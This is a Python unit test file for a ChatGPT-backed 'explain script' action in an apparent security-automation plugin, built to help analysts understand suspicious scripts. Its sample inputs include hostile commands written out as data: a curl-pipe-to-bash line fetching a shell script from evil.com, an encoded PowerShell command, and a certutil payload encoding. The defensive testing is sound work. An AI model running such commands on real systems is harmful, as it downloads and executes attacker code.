import unittest
from unittest.mock import MagicMock

from insightconnect_plugin_runtime.exceptions import PluginException

from komand_chatgpt.actions.explain_script.action import ExplainScript
from komand_chatgpt.actions.explain_script.schema import Input, Output
from unit_test.util import create_mock_action, load_fixture


class TestExplainScript(unittest.TestCase):
    def setUp(self):
        self.action = create_mock_action(ExplainScript)
        self.mock_response = load_fixture("explain_script_success.json")

    def test_explain_powershell_script(self):
        """Test explaining a PowerShell encoded command."""
        self.action.connection.client.chat_completion_json.return_value = self.mock_response

        result = self.action.run(
            {
                Input.SCRIPT: "powershell -enc SQBFAFgA...",
                Input.SCRIPT_TYPE: "powershell",
                Input.CONTEXT: "Found in a scheduled task on a compromised endpoint",
            }
        )

        self.assertIn(Output.EXPLANATION, result)
        self.assertIn(Output.RISK_LEVEL, result)
        self.assertIn(Output.TECHNIQUES, result)
        self.assertIn(Output.INDICATORS, result)
        self.assertIsInstance(result[Output.TECHNIQUES], list)
        self.assertIsInstance(result[Output.INDICATORS], list)
        self.assertIn("CRITICAL", result[Output.RISK_LEVEL])

    def test_explain_script_without_context(self):
        """Test explaining a script without additional context."""
        self.action.connection.client.chat_completion_json.return_value = self.mock_response

        result = self.action.run(
            {
                Input.SCRIPT: "curl http://evil.com/shell.sh | bash",
                Input.SCRIPT_TYPE: "bash",
            }
        )

        self.assertIn(Output.EXPLANATION, result)
        call_args = self.action.connection.client.chat_completion_json.call_args
        prompt_arg = call_args[1]["prompt"] if "prompt" in (call_args[1] or {}) else call_args[0][0]
        self.assertNotIn("Context where this was found", prompt_arg)

    def test_explain_script_unknown_type(self):
        """Test explaining a script with unknown type defaults."""
        self.action.connection.client.chat_completion_json.return_value = self.mock_response

        result = self.action.run(
            {
                Input.SCRIPT: "some obfuscated content",
            }
        )

        self.assertIn(Output.EXPLANATION, result)
        call_args = self.action.connection.client.chat_completion_json.call_args
        prompt_arg = call_args[1]["prompt"] if "prompt" in (call_args[1] or {}) else call_args[0][0]
        self.assertIn("unknown", prompt_arg)

    def test_explain_script_with_context(self):
        """Test that context is included in the prompt."""
        self.action.connection.client.chat_completion_json.return_value = self.mock_response

        result = self.action.run(
            {
                Input.SCRIPT: "certutil -encode payload.exe payload.txt",
                Input.SCRIPT_TYPE: "batch",
                Input.CONTEXT: "Found in startup folder",
            }
        )

        call_args = self.action.connection.client.chat_completion_json.call_args
        prompt_arg = call_args[1]["prompt"] if "prompt" in (call_args[1] or {}) else call_args[0][0]
        self.assertIn("Found in startup folder", prompt_arg)

    def test_explain_script_api_error(self):
        """Test that API errors propagate correctly."""
        self.action.connection.client.chat_completion_json.side_effect = PluginException(
            cause="ChatGPT returned a response that could not be parsed as JSON",
            assistance="Try running the request again",
        )

        with self.assertRaises(PluginException):
            self.action.run(
                {
                    Input.SCRIPT: "test script",
                    Input.SCRIPT_TYPE: "powershell",
                }
            )
